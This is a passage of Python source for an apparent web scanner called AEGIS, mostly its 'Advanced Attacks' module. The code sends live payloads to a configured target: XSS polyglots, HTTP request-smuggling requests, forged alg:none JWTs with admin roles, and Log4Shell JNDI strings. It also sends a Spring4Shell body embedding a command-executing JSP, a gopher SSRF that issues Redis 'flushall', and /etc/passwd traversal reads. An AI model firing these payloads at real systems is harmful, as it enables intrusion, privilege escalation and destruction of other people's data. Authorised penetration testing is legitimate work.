    Deserialization · Business Logic · ReDoS · CRLF
    Host Header · Path Normalization · Nginx Alias Traversal
    Log4Shell · Spring4Shell · SSRF Exotic Protocols
    WebSocket CSWSH · OAuth Leakage · Server-Timing Side-Channel
    Second-Order Injection · API Version Enum · Polyglot Payloads
    """

    POLYGLOTS = [
        "'\"><img/src=x onerror=alert(1)>--",
        "<svg><script>alert&#40;1&#41;</script>",
        "{{7*7}}${7*7}<%=7*7%>#{7*7}",
        '{"__proto__":{"isAdmin":true}}',
        "\uff1cscript\uff1ealert(1)\uff1c/script\uff1e",
        "jaVasCript:/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//\\x3csVg/<sVg/oNloAd=alert()//>>",
    ]

    JAVA_SERIAL_PROBE   = "rO0ABXNy"
    PHP_SERIAL_PROBE    = 'O:8:"stdClass":1:{s:4:"test";s:5:"aegis";}'
    DOTNET_VS_PROBE     = "/wEy"

    SMUGGLE_CL_TE = (
        "POST / HTTP/1.1\r\nHost: {host}\r\n"
        "Content-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n"
        "0\r\n\r\nG"
    )
    SMUGGLE_TE_CL = (
        "POST / HTTP/1.1\r\nHost: {host}\r\n"
        "Transfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\n"
        "8\r\nSMUGGLED\r\n0\r\n\r\n"
    )

    @staticmethod
    def _b64url_decode(s):
        s += "=" * (4 - len(s) % 4)
        return base64.urlsafe_b64decode(s)

    @staticmethod
    def _b64url_encode(b):
        return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

    @classmethod
    def _forge_jwt_none(cls, token):
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return None
            header  = json.loads(cls._b64url_decode(parts[0]))
            payload = json.loads(cls._b64url_decode(parts[1]))
            header["alg"] = "none"
            for field in ("role", "admin", "is_admin", "user_type", "privilege"):
                if field in payload:
                    payload[field] = "admin" if isinstance(payload[field], str) else 1
            nh = cls._b64url_encode(json.dumps(header, separators=(",", ":")).encode())
            np = cls._b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
            return nh + "." + np + "."
        except Exception:
            return None

    def __init__(self, config, adaptive):
        self.config   = config
        self.adaptive = adaptive
        self.findings = []

    async def run(self, http, results):
        cprint("[bold cyan]  Phase 11:[/bold cyan] Advanced Attacks…")
        base = self.config.target
        tasks = [
            self._cache_poisoning(http, base),
            self._graphql(http, base),
            self._host_header(http, base),
            self._crlf(http, base),
            self._param_pollution(http, base),
            self._path_normalization(http, base),
            self._request_smuggling(base),
            self._jwt(http, base, results),
            self._deserialization(http, base),
            self._race_condition(http, base),
            self._business_logic(http, base),
            self._redos(http, base, results),
            self._api_versioning(http, base),
            self._websocket(http, base),
            self._ssrf_protocols(http, base),
            self._polyglots(http, base, results),
            self._log4shell(http, base),
            self._spring4shell(http, base),
            self._nginx_alias(http, base),
            self._oauth_leakage(http, base, results),
            self._server_timing(http, base),
            self._prototype_pollution(http, base, results),
            self._second_order(http, base, results),
        ]
        await asyncio.gather(*tasks, return_exceptions=True)
        cprint("[cyan]  Advanced attacks: {} findings[/cyan]".format(len(self.findings)))
        return self.findings

    # ── Cache Poisoning ──────────────────────────────────────────────────

    async def _cache_poisoning(self, http, base):
        for header, value in [
            ("X-Forwarded-Host",   "evil.aegis.internal"),
            ("X-Original-URL",     "/admin"),
            ("X-Rewrite-URL",      "/admin"),
            ("X-Host",             "evil.aegis.internal"),
            ("Forwarded",          "host=evil.aegis.internal"),
            ("X-Forwarded-Scheme", "javascript"),
        ]:
            try:
                r = await http.get(base, headers={header: value})
                if r and (value in (r.get("body") or "") or
                          value in str(r.get("headers", {}))):
                    self._add("Web Cache Poisoning",
                               "Unkeyed header `{}:{}` reflected in response — cache may serve poisoned content to other users".format(header, value),
                               "HIGH", base, {"header": header, "value": value})
            except Exception as _exc:
                log.debug("_cache_poisoning: %s", _exc)
            await self.adaptive.adaptive_sleep()

    # ── GraphQL ──────────────────────────────────────────────────────────

    async def _graphql(self, http, base):
        intro = '{"query":"{__schema{types{name}}}"}'
        batch = json.dumps([{"query": "{__schema{types{name}}}"}] * 50)
        inject = '{"query":"{ user(id: \\"1 OR 1=1\\") { id name email } }"}'
        for path in ["/graphql", "/api/graphql", "/gql", "/graphiql",
                     "/v1/graphql", "/query", "/playground"]:
            url = base.rstrip("/") + path
            try:
                r = await http.post(url, data=intro,
                                    headers={"Content-Type": "application/json"})
                if r and r.get("status") == 200:
                    body = r.get("body", "")
                    if "__schema" in body or '"types"' in body:
                        self._add("GraphQL Introspection Enabled",
                                   "Full schema exposed at `{}` — all types, queries, mutations enumerable".format(path),
                                   "MEDIUM", url, {"path": path})
                    rb = await http.post(url, data=batch,
                                         headers={"Content-Type": "application/json"})
                    if rb and rb.get("status") == 200:
                        self._add("GraphQL Batch Abuse",
                                   "Batch queries unlimited at `{}` — DoS / query amplification possible".format(path),
                                   "MEDIUM", url, {})
                    ri = await http.post(url, data=inject,
                                         headers={"Content-Type": "application/json"})
                    if ri:
                        bi = (ri.get("body") or "").lower()
                        if "error" not in bi and len(bi) > 50:
                            self._add("GraphQL Injection",
                                       "Unsanitized user input accepted at `{}`".format(path),
                                       "HIGH", url, {"payload": inject[:60]})
            except Exception as _exc:
                log.debug("unknown: %s", _exc)

    # ── Host Header ──────────────────────────────────────────────────────

    async def _host_header(self, http, base):
        for hdrs in [{"Host": "evil.aegis.internal"},
                     {"Host": "evil.aegis.internal:443"},
                     {"X-Forwarded-Host": "evil.aegis.internal"}]:
            try:
                r = await http.get(base, headers=hdrs)
                if r:
                    body = r.get("body", "") or ""
                    if any("evil.aegis" in v for v in hdrs.values() if "evil" in v) \
                       and "evil.aegis" in body:
                        self._add("Host Header Injection",
                                   "Host value reflected in response — password reset poisoning / cache poisoning risk",
                                   "HIGH", base, {"headers": hdrs})
            except Exception as _exc:
                log.debug("_host_header: %s", _exc)

    # ── CRLF ─────────────────────────────────────────────────────────────

    async def _crlf(self, http, base):
        for payload in ["%0d%0aX-Injected: aegis",
                         "%0d%0a%0d%0a<html>aegis</html>",
                         "?next=%0d%0aLocation:%20https://evil.com",
                         "/%0d%0aLocation:%20https://evil.com"]:
            try:
                url = base.rstrip("/") + payload
                r   = await http.get(url)
                if r:
                    hdrs = r.get("headers", {})
                    if any("x-injected" in k.lower() or "aegis" in str(v).lower()
                           for k, v in hdrs.items()):
                        self._add("CRLF Injection",
                                   "CRLF sequence in URL causes header injection: `{}`".format(payload),
                                   "HIGH", url, {"payload": payload})
            except Exception as _exc:
                log.debug("_crlf: %s", _exc)

    # ── Parameter Pollution ───────────────────────────────────────────────

    async def _param_pollution(self, http, base):
        for url_suffix in ["?id=1&id=2", "?role=user&role=admin",
                            "?debug=false&debug=true"]:
            try:
                r = await http.get(base.rstrip("/") + url_suffix)
                if r and r.get("status") == 200:
                    body = r.get("body", "") or ""
                    if "admin" in body.lower() or "debug" in body.lower():
                        self._add("HTTP Parameter Pollution",
                                   "Duplicate parameters produce unexpected behavior: `{}`".format(url_suffix),
                                   "MEDIUM", base, {"suffix": url_suffix})
            except Exception as _exc:
                log.debug("_param_pollution: %s", _exc)

    # ── Path Normalization ────────────────────────────────────────────────

    async def _path_normalization(self, http, base):
        from urllib.parse import urlparse
        origin = "{scheme}://{netloc}".format(**urlparse(base)._asdict())
        admin_url = origin + "/admin"
        try:
            ref = await http.get(admin_url)
            ref_status = ref.get("status") if ref else 0
        except Exception:
            ref_status = 0
        for path in ["/admin/%2e%2e/", "/%2f%2f/admin", "/./admin",
                      "/%252fadmin", "/%c0%af", "/admin%09",
                      "/..%2fadmin%2f..%2f"]:
            try:
                r = await http.get(origin + path)
                if r and r.get("status") == 200 and ref_status in (401, 403, 404):
                    self._add("Path Normalization Bypass",
                               "Encoded path `{}` bypasses access control (ref={} bypass=200)".format(path, ref_status),
                               "CRITICAL", origin + path,
                               {"path": path, "ref_status": ref_status})
            except Exception as _exc:
                log.debug("_path_normalization: %s", _exc)

    # ── Request Smuggling ─────────────────────────────────────────────────

    async def _request_smuggling(self, base):
        from urllib.parse import urlparse
        import ssl as _ssl, socket as _socket
        parsed = urlparse(base)
        host   = parsed.hostname or parsed.netloc
        port   = parsed.port or (443 if parsed.scheme == "https" else 80)
        use_tls = parsed.scheme == "https"

        for name, tmpl in [("CL.TE", self.SMUGGLE_CL_TE),
                            ("TE.CL", self.SMUGGLE_TE_CL)]:
            try:
                raw = tmpl.format(host=host).encode()
                loop = asyncio.get_event_loop()

                def _probe():
                    s = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
                    s.settimeout(5)
                    if use_tls:
                        ctx = _ssl.create_default_context()
                        ctx.check_hostname = False
                        ctx.verify_mode    = _ssl.CERT_NONE
                        s = ctx.wrap_socket(s, server_hostname=host)
                    s.connect((host, port))
                    s.sendall(raw)
                    resp = b""
                    try:
                        while True:
                            c = s.recv(4096)
                            if not c:
                                break
                            resp += c
                    except Exception as _exc:
                        log.debug("_probe: %s", _exc)
                    s.close()
                    return resp.decode(errors="replace")

                resp_text = await asyncio.wait_for(
                    loop.run_in_executor(None, _probe), timeout=8)
                if ("unrecognized method" in resp_text.lower() or
                        resp_text.count("HTTP/1") >= 2):
                    self._add("HTTP Request Smuggling ({})".format(name),
                               "Server exhibits {} desync — front/back-end disagree on request boundary".format(name),
                               "CRITICAL", base, {"technique": name})
            except Exception as _exc:
                log.debug("unknown: %s", _exc)

    # ── JWT ───────────────────────────────────────────────────────────────

    async def _jwt(self, http, base, results):
        pat = re.compile(r"eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]*")
        tokens = set()
        for crawl in (results.crawl or []):
            for m in pat.finditer(crawl.body or ""):
                tokens.add(m.group())
        for token in list(tokens)[:5]:
            forged = self._forge_jwt_none(token)
            if not forged:
                continue
            for path in ["/api/me", "/api/user", "/dashboard", "/admin", "/profile"]:
                try:
                    r = await http.get(base.rstrip("/") + path, headers={
                        "Authorization": "Bearer " + forged,
                        "Cookie":        "token={}; session={}".format(forged, forged),
                    })
                    if r and r.get("status") == 200:
                        body = (r.get("body") or "").lower()
                        if any(k in body for k in ["admin", "email", "user", "role"]):
                            self._add("JWT alg:none Bypass",
                                       "Forged JWT accepted at `{}` — signature verification disabled".format(path),
                                       "CRITICAL", base.rstrip("/") + path,
                                       {"forged_prefix": forged[:40] + "…"})
                except Exception as _exc:
                    log.debug("unknown: %s", _exc)

    # ── Deserialization ───────────────────────────────────────────────────

    async def _deserialization(self, http, base):
        probes = [
            ("Java Deserialization",  self.JAVA_SERIAL_PROBE,  "application/x-java-serialized-object"),
            ("PHP Deserialization",   self.PHP_SERIAL_PROBE,   "application/x-www-form-urlencoded"),
            (".NET ViewState",        self.DOTNET_VS_PROBE,    "application/x-www-form-urlencoded"),
        ]
        for path in ["/api/", "/rpc", "/service", "/upload", "/data", "/object"]:
            url = base.rstrip("/") + path
            for name, probe, ct in probes:
                try:
                    r = await http.post(url, data=probe,
                                        headers={"Content-Type": ct})
                    if r:
                        body = (r.get("body") or "").lower()
                        if any(kw in body for kw in
                               ["deseri", "unserializ", "classnotfound",
                                "readobject", "unmarshall", "invalidclassexception"]):
                            self._add(name,
                                       "Deserialization error leaked at `{}` — possible RCE vector".format(path),
                                       "CRITICAL", url,
                                       {"probe": probe[:30], "ct": ct})
                except Exception as _exc:
                    log.debug("unknown: %s", _exc)

    # ── Race Conditions ───────────────────────────────────────────────────

    async def _race_condition(self, http, base):
        for path, payload in [
            ("/api/redeem",  {"code": "RACE10"}),
            ("/checkout",    {"coupon": "SAVE50"}),
            ("/vote",        {"id": 1}),
            ("/api/like",    {"post_id": 1}),
        ]:
            url = base.rstrip("/") + path
            try:
                tasks = [http.post(url, data=json.dumps(payload),
                                   headers={"Content-Type": "application/json"})
                         for _ in range(20)]
                responses = await asyncio.gather(*tasks, return_exceptions=True)
                ok = [r for r in responses
                      if isinstance(r, dict) and r.get("status") == 200]
                if len(ok) > 10:
                    self._add("Race Condition / TOCTOU",
                               "{}/20 parallel requests to `{}` all succeeded — possible double-spend".format(len(ok), path),
                               "HIGH", url,
                               {"concurrent_ok": len(ok), "payload": payload})
            except Exception as _exc:
                log.debug("unknown: %s", _exc)

    # ── Business Logic ────────────────────────────────────────────────────

    async def _business_logic(self, http, base):
        probes = [
            ("/cart/add",      {"product_id": 1, "qty": -1,    "price": -9.99}),
            ("/api/order",     {"amount": -100,   "currency":  "USD"}),
            ("/cart/add",      {"qty": 2147483648}),
            ("/api/subscribe", {"plan": "free",   "duration":  99999}),
            ("/apply_coupon",  {"code": "FIRSTTIME", "user_id": 2}),
        ]
        for path, data in probes:
            try:
                r = await http.post(base.rstrip("/") + path,
                                    data=json.dumps(data),
                                    headers={"Content-Type": "application/json"})
                if r and r.get("status") in (200, 201):
                    body = (r.get("body") or "").lower()
                    if any(kw in body for kw in ["success", "added", "applied",
                                                  "order", "confirmed"]):
                        self._add("Business Logic Vulnerability",
                                   "Endpoint `{}` accepted anomalous values: {}".format(path, data),
                                   "HIGH", base.rstrip("/") + path, {"payload": data})
            except Exception as _exc:
                log.debug("unknown: %s", _exc)

    # ── ReDoS ─────────────────────────────────────────────────────────────

    async def _redos(self, http, base, results):
        import time as _time
        redos_payloads = [
            "a" * 30 + "!",
            "(" * 30 + "a" * 30,
            "a" * 100 + "@" + "a" * 100 + ".com",
        ]
        test_urls = list({c.url for c in (results.crawl or []) if "?" in c.url})[:5]
        for url in (test_urls or [base + "?q=test"]):
            base_url = url.split("?")[0]
            param    = url.split("?")[1].split("=")[0] if "?" in url else "q"
            for payload in redos_payloads:
                try:
                    probe = base_url + "?" + param + "=" + urllib.parse.quote(payload)
                    t0    = _time.monotonic()
                    await asyncio.wait_for(http.get(probe), timeout=15)
                    elapsed = _time.monotonic() - t0
                    if elapsed > 8:
                        self._add("ReDoS",
                                   "Parameter `{}` took {:.1f}s with ReDoS payload".format(param, elapsed),
                                   "HIGH", probe,
                                   {"payload": payload[:40], "elapsed": round(elapsed, 2)})
                except asyncio.TimeoutError:
                    self._add("ReDoS (Server Timeout)",
                               "Request timed out (>15s) with catastrophic regex payload on `{}`".format(param),
                               "HIGH", url, {"payload": payload[:40]})
                except Exception as _exc:
                    log.debug("unknown: %s", _exc)

    # ── API Version Enum ──────────────────────────────────────────────────

    async def _api_versioning(self, http, base):
        found = []
        for path in ["/api/v1/", "/api/v2/", "/api/v3/", "/api/v0/",
                      "/v1/", "/v2/", "/api/beta/", "/api/legacy/",
                      "/api/internal/", "/api/deprecated/"]:
            try:
                r = await http.get(base.rstrip("/") + path)
                if r and r.get("status") not in (404, 410):
                    found.append((path, r.get("status")))
            except Exception as _exc:
                log.debug("_api_versioning: %s", _exc)
        if len(found) > 1:
            desc = ", ".join("`{}` ({})".format(p, s) for p, s in found)
            self._add("Multiple API Versions Exposed",
                       "{} API versions found: {} — older versions may lack security patches".format(len(found), desc),
                       "MEDIUM", base, {"versions": found})

    # ── WebSocket / CSWSH ─────────────────────────────────────────────────

    async def _websocket(self, http, base):
        for path in ["/ws", "/websocket", "/socket", "/socket.io/",
                      "/echo", "/realtime", "/live", "/events"]:
            url = base.rstrip("/") + path
            try:
                key = base64.b64encode(os.urandom(16)).decode()
                r   = await http.get(url, headers={
                    "Upgrade": "websocket", "Connection": "Upgrade",
                    "Sec-WebSocket-Key": key, "Sec-WebSocket-Version": "13",
                })
                if r and r.get("status") in (101, 200, 400):
                    self._add("WebSocket Endpoint Found",
                               "WebSocket at `{}` — audit authentication and message validation".format(path),
                               "INFO", url, {})
                    key2 = base64.b64encode(os.urandom(16)).decode()
                    r2   = await http.get(url, headers={
                        "Upgrade": "websocket", "Connection": "Upgrade",
                        "Sec-WebSocket-Key": key2, "Sec-WebSocket-Version": "13",
                        "Origin": "https://evil.aegis.internal",
                    })
                    if r2 and r2.get("status") == 101:
                        self._add("Cross-Site WebSocket Hijacking (CSWSH)",
                                   "WebSocket at `{}` does not validate Origin — CSWSH attack possible".format(path),
                                   "HIGH", url,
                                   {"evil_origin": "https://evil.aegis.internal"})
            except Exception as _exc:
                log.debug("unknown: %s", _exc)

    # ── SSRF Exotic Protocols ─────────────────────────────────────────────

    async def _ssrf_protocols(self, http, base):
        probes = [
            "gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A",
            "dict://127.0.0.1:6379/info",
            "file:///etc/passwd",
            "file:///c:/windows/win.ini",
            "ldap://127.0.0.1:389/",
        ]
        for param in ["url", "uri", "path", "redirect", "image", "src", "load"]:
            for probe in probes[:3]:
                try:
                    r = await http.get(
                        base.rstrip("/") + "?" + param + "=" + urllib.parse.quote(probe))
                    if r:
                        body = (r.get("body") or "").lower()
                        if any(kw in body for kw in ["root:", "daemon:", "redis_version",
                                                      "windows", "dn:"]):
                            self._add("SSRF via Exotic Protocol",
                                       "Parameter `{}` processed `{}` — internal service access confirmed".format(
                                           param, probe.split(":")[0]),
                                       "CRITICAL", base,
                                       {"protocol": probe.split(":")[0], "param": param})
                except Exception as _exc:
                    log.debug("unknown: %s", _exc)

    # ── Polyglots ─────────────────────────────────────────────────────────

    async def _polyglots(self, http, base, results):
        test_urls = list({c.url for c in (results.crawl or []) if "?" in c.url})[:8]
        for url in test_urls:
            base_url = url.split("?")[0]
            params   = url.split("?", 1)[1] if "?" in url else ""
            if not params:
                continue
            for poly in self.POLYGLOTS[:3]:
                try:
                    mutated = self.adaptive.mutate_payload(poly, "polyglot")
                    new_p   = "&".join(
                        k.split("=")[0] + "=" + urllib.parse.quote(mutated)
                        for k in params.split("&")
                    )
                    r = await http.get(base_url + "?" + new_p)
                    if r:
                        body = r.get("body", "") or ""
                        hit  = ("alert" in body.lower() or "<script>" in body.lower() or
                                "isadmin" in body.lower())
                        last = (self.adaptive.profile.mutation_history[-1]["encoder"]
                                if self.adaptive.profile.mutation_history else "raw")
                        self.adaptive.record_outcome(last, "polyglot", hit)
                        if hit:
                            self._add("Polyglot Payload Reflection",
                                       "Multi-context injection at `{}`".format(base_url),
                                       "CRITICAL", base_url + "?" + new_p,
                                       {"polyglot": poly[:60]})
                except Exception as _exc:
                    log.debug("unknown: %s", _exc)

    # ── Log4Shell ─────────────────────────────────────────────────────────

    async def _log4shell(self, http, base):
        canary = "log4shell-aegis-probe"
        payloads = [
            "${jndi:ldap://127.0.0.1:1389/" + canary + "}",
            "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://127.0.0.1:1099/" + canary + "}",
        ]
        for header in ["User-Agent", "X-Forwarded-For", "X-Api-Version", "Referer"]:
            for payload in payloads:
                try:
                    r = await http.get(base, headers={header: payload})
                    if r:
                        body   = (r.get("body") or "").lower()
                        status = r.get("status", 0)
                        if any(kw in body for kw in ["jndi", "ldap", "log4j",
                                                      "namingexception"]):
                            self._add("Log4Shell CVE-2021-44228 (Active)",
                                       "JNDI lookup error via `{}` header — target processes Log4j expressions".format(header),
                                       "CRITICAL", base,
                                       {"header": header, "payload": payload[:60]})
                        elif status == 500 and header == "User-Agent":
                            self._add("Log4Shell CVE-2021-44228 (Possible)",
                                       "Server returned 500 on JNDI payload in User-Agent — verify manually",
                                       "HIGH", base, {"header": header})
                except Exception as _exc:
                    log.debug("unknown: %s", _exc)

    # ── Spring4Shell ──────────────────────────────────────────────────────

    async def _spring4shell(self, http, base):
        boundary = "aegis_s4s"
        body = (
            "--{b}\r\nContent-Disposition: form-data; name=\"class.module.classLoader"
            ".resources.context.parent.pipeline.first.pattern\"\r\n\r\n"
            "%{{c2}}i if(\"aegis\".equals(request.getParameter(\"pwd\"))) {{"
            "java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter"
            "(\"cmd\")).getInputStream();}}%{{suffix}}i\r\n--{b}--\r\n"
        ).format(b=boundary)
        for path in ["/", "/login", "/actuator"]:
            try:
                r = await http.post(base.rstrip("/") + path, data=body, headers={
                    "Content-Type": "multipart/form-data; boundary=" + boundary,
                    "suffix": "%>//", "c2": "<%",
                })
                if r:
                    resp_body = (r.get("body") or "").lower()
                    if "java" in resp_body and "exception" in resp_body:
                        self._add("Spring4Shell CVE-2022-22965 (Possible)",
                                   "Spring class binding probe at `{}` triggered Java exception".format(path),
                                   "CRITICAL", base.rstrip("/") + path, {"path": path})
            except Exception as _exc:
                log.debug("unknown: %s", _exc)

    # ── Nginx Alias Traversal ─────────────────────────────────────────────

    async def _nginx_alias(self, http, base):
        for path in ["/static", "/assets", "/media", "/files", "/uploads"]:
            try:
                url = base.rstrip("/") + path + "../etc/passwd"
                r   = await http.get(url)
                if r and r.get("status") == 200:
                    body = r.get("body", "") or ""
                    if "root:" in body:
                        self._add("Nginx Alias Traversal",
                                   "Nginx alias misconfiguration at `{}` exposes `/etc/passwd`".format(path),
                                   "CRITICAL", url, {"path": path})
            except Exception as _exc:
                log.debug("_nginx_alias: %s", _exc)

    # ── OAuth Leakage ─────────────────────────────────────────────────────

    async def _oauth_leakage(self, http, base, results):
        pat = re.compile(
            r'(?:access_token|refresh_token|id_token|client_secret)'
            r'[=:"\s]+([A-Za-z0-9_\-\.]{20,})', re.I)
        for crawl in (results.crawl or []):
            m = pat.search(crawl.body or "")
            if m:
                self._add("OAuth Token Leaked in Source",
                           "Token pattern found in page source at `{}`".format(crawl.url),
                           "CRITICAL", crawl.url,
                           {"token_prefix": m.group(1)[:12] + "…"})
        for path in ["/oauth/authorize", "/oauth2/authorize", "/auth/callback"]:
            url = base.rstrip("/") + path + "?redirect_uri=https://evil.aegis.internal"
            try:
                r = await http.get(url)
                if r:
                    loc = (r.get("headers") or {}).get(
                        "location", r.get("headers", {}).get("Location", ""))
                    if "evil.aegis.internal" in str(loc):
                        self._add("OAuth Open Redirect",
                                   "OAuth callback at `{}` accepts unvalidated redirect_uri".format(path),
                                   "HIGH", url,
                                   {"redirect_uri": "https://evil.aegis.internal"})
            except Exception as _exc:
                log.debug("unknown: %s", _exc)

    # ── Server Timing ─────────────────────────────────────────────────────

    async def _server_timing(self, http, base):
        import time as _time
        for path in ["/login", "/api/login", "/auth/login", "/sign-in"]:
            url = base.rstrip("/") + path
            try:
                t0 = _time.monotonic()
                await asyncio.wait_for(http.get(url + "?username=AEGIS_NOTREAL_XYZ99"), timeout=10)
                t_miss = _time.monotonic() - t0
                t0 = _time.monotonic()
                await asyncio.wait_for(http.get(url + "?username=admin"), timeout=10)
                t_hit  = _time.monotonic() - t0
                diff   = abs(t_hit - t_miss)
                if diff > 0.5:
                    self._add("User Enumeration via Timing",
                               "Login `{}` has {:.2f}s timing differential between valid/invalid usernames".format(path, diff),
                               "MEDIUM", url,
                               {"timing_diff_s": round(diff, 3)})
            except Exception as _exc:
                log.debug("_server_timing: %s", _exc)

    # ── Prototype Pollution ───────────────────────────────────────────────

    async def _prototype_pollution(self, http, base, results):
        pp_params = ["__proto__[isAdmin]=true",
                      "constructor[prototype][isAdmin]=true"]
        pp_bodies = ['{"__proto__":{"isAdmin":true}}',
                      '{"constructor":{"prototype":{"isAdmin":true}}}']
        for url in list({c.url for c in (results.crawl or []) if "?" in c.url})[:5]:
            base_url = url.split("?")[0]
            for param in pp_params:
                try:
                    r = await http.get(base_url + "?" + param)
                    if r and '"isadmin":true' in (r.get("body") or "").lower():
                        self._add("Prototype Pollution (URL)",
                                   "Prototype pollution via `{}` reflected in response".format(param),
                                   "HIGH", base_url, {"payload": param})
                except Exception as _exc:
                    log.debug("_prototype_pollution: %s", _exc)
        for path in ["/api/", "/api/v1/", "/api/user", "/api/settings"]:
            url = base.rstrip("/") + path
            for body in pp_bodies:
                try:
                    r = await http.post(url, data=body,
                                        headers={"Content-Type": "application/json"})
                    if r and "isadmin" in (r.get("body") or "").lower():
                        self._add("Prototype Pollution (JSON)",
                                   "JSON prototype pollution at `{}` modified server object".format(path),
                                   "CRITICAL", url, {"payload": body[:60]})
                except Exception as _exc:
                    log.debug("unknown: %s", _exc)

    # ── Second-Order ──────────────────────────────────────────────────────

    async def _second_order(self, http, base, results):
        marker = "AEGIS2ND_" + "".join(random.choices("ABCDEF0123456789", k=8))
        for path, data in [
            ("/register",  {"username": "' OR '{}'='{}'".format(marker, marker),
                            "email": marker + "@test.com", "password": "Aa1!aegis"}),
            ("/api/notes", {"title": marker, "content": "<script>" + marker + "</script>"}),
        ]:
            try:
                r = await http.post(base.rstrip("/") + path,
                                    data=json.dumps(data),
                                    headers={"Content-Type": "application/json"})
                if r and r.get("status") in (200, 201, 302):
                    for read_path in ["/profile", "/dashboard", "/notes", "/feed"]:
                        try:
                            r2 = await http.get(base.rstrip("/") + read_path)
                            if r2 and marker in (r2.get("body") or ""):
                                self._add("Second-Order Injection",
                                           "Payload planted at `{}` reflected at `{}`".format(path, read_path),
                                           "HIGH", base.rstrip("/") + path,
                                           {"plant": path, "read": read_path})
                        except Exception as _exc:
                            log.debug("unknown: %s", _exc)
            except Exception as _exc:
                log.debug("unknown: %s", _exc)

    # ── Helper ────────────────────────────────────────────────────────────

    def _add(self, vuln_type, detail, severity, url, extra):
        self.findings.append(VulnResult(
            url=url, vuln_type=vuln_type, severity=severity,
            detail=detail, payload=json.dumps(extra) if extra else "",
            evidence="",
        ))


class AEGIS:
    """
    Main AEGIS orchestrator.
    Coordinates all modules and collects results.
    """

    def __init__(self, config: ScanConfig):
        self.config   = config
        self.results  = ScanResults(target=config.target)
        self._http    = None
        self._adaptive = AdaptiveEngine(config)

    async def run(self) -> ScanResults:
        self.results.start_time = datetime.now(timezone.utc).isoformat()
        t0 = time.monotonic()

        cprint(BANNER if HAS_RICH else BANNER.replace("[bold cyan]","").replace("[/bold cyan]",""))
        cprint(f"[bold cyan]  Target  :[/bold cyan] {self.config.target}")
        cprint(f"[bold cyan]  Output  :[/bold cyan] {self.config.output_dir}")
        cprint(f"[bold cyan]  Threads :[/bold cyan] {self.config.threads}")
        cprint(f"[bold cyan]  Depth   :[/bold cyan] {self.config.depth}")
        if self.config.stealth:   cprint("[yellow]  Stealth mode ON[/yellow]")
        if self.config.proxy:     cprint(f"[yellow]  Proxy: {self.config.proxy}[/yellow]")
        if self.config.ml_enabled:cprint("[cyan]  ML scoring enabled[/cyan]")
        CONSOLE.rule("[dim]Starting scan[/dim]")

        async with HTTPClient(self.config) as http:
            self._http = http

            # ── Phase 1: Crawl ────────────────────────
            await self._phase_crawl(http)

            # ── Phase 2: DNS ──────────────────────────
            await self._phase_dns()

            # ── Phase 3: SSL ──────────────────────────
            await self._phase_ssl()

            # ── Phase 4: Port scan ────────────────────
            if self.config.scan_ports:
                await self._phase_ports()

            # ── Phase 5: Subdomain enum ───────────────
            if self.config.scan_subdomains:
                await self._phase_subdomains(http)

            # ── Phase 6: Vulnerability scan ───────────
            if self.config.scan_vulns:
                await self._phase_vulns(http)

            # ── Phase 7: Directory brute ──────────────
            await self._phase_dirbust(http)

            # ── Phase 8: OSINT ────────────────────────
            if self.config.scan_osint:
                await self._phase_osint(http)

            # ── Phase 9: Plugins ──────────────────────
            await self._phase_plugins()

            # ── Phase 11: Advanced Attacks ────────────
            await self._phase_advanced(http)

        # ── Phase 10: ML scoring ──────────────────────
        if self.config.ml_enabled:
            cprint("[cyan]  ML scoring…[/cyan]")
            self.results.ml_scores = MLScorer().score_results(self.results)

        # ── Finalize ──────────────────────────────────
        self.results.end_time = datetime.now(timezone.utc).isoformat()
        self.results.duration = round(time.monotonic() - t0, 2)

        CONSOLE.rule("[dim]Generating reports[/dim]")
        ReportGenerator(self.config).generate_all(self.results)
        self._print_summary()
        return self.results

    # ─────────────────────────────────────────────────
    # PHASE METHODS
    # ─────────────────────────────────────────────────

    async def _phase_crawl(self, http: HTTPClient):
        cprint("[bold cyan]  ◈ Phase 1:[/bold cyan] Crawling…")
        crawler = CrawlerModule(self.config, http)
        crawl, nodes, edges = await crawler.run()
        self.results.crawl       = crawl
        self.results.graph_nodes = nodes
        self.results.graph_edges = edges
        # Collect all findings & emails
        for c in crawl:
            self.results.findings.extend(c.findings)
            # Tech detection per page
            dummy_resp = {
                "text": "", "headers": c.headers, "type": c.content_type
            }
        # Aggregate technologies
        tech_counter: Counter = Counter()
        for c in crawl:
            resp_obj = {
                "text":    "",  # heavy, skip full body for perf
                "headers": c.headers,
                "type":    c.content_type
            }
            for t in TechDetector.detect(resp_obj):
                tech_counter[t.name] += t.confidence
        for name, conf in tech_counter.most_common(20):
            self.results.technologies.append(
                TechResult(name=name, confidence=min(100, conf))
            )
        cprint(f"  [green]✓[/green] Crawled {len(crawl)} pages · {len(nodes)} graph nodes")

    async def _phase_dns(self):
        cprint("[bold cyan]  ◈ Phase 2:[/bold cyan] DNS enumeration…")
        dns_mod = DNSModule(self.config)
        self.results.dns = await dns_mod.run()
        cprint(f"  [green]✓[/green] {len(self.results.dns)} DNS records")

    async def _phase_ssl(self):
        if not self.config.scan_ssl:
            return
        parsed = urlparse(self.config.target)
        if parsed.scheme != "https":
            return
        cprint("[bold cyan]  ◈ Phase 3:[/bold cyan] SSL/TLS analysis…")
        host = parsed.hostname or parsed.netloc
        port = parsed.port or 443
        ssl_anal = SSLAnalyzer(self.config)
        self.results.ssl = await ssl_anal.analyze(host, port)
        if self.results.ssl:
            n_issues = len(self.results.ssl.vulnerabilities)
            cprint(f"  [green]✓[/green] SSL analysis complete · {n_issues} issue(s)")

    async def _phase_ports(self):
        cprint("[bold cyan]  ◈ Phase 4:[/bold cyan] Port scanning…")
        parsed = urlparse(self.config.target)
        host   = parsed.hostname or parsed.netloc
        ip     = get_ip(host) if not is_ip(host) else host
        if not ip:
            cprint("  [yellow]  Could not resolve host for port scan[/yellow]")
            return
        scanner = PortScanner(self.config)
        self.results.ports = await scanner.scan(ip)
        open_n = sum(1 for p in self.results.ports if p.state == "open")
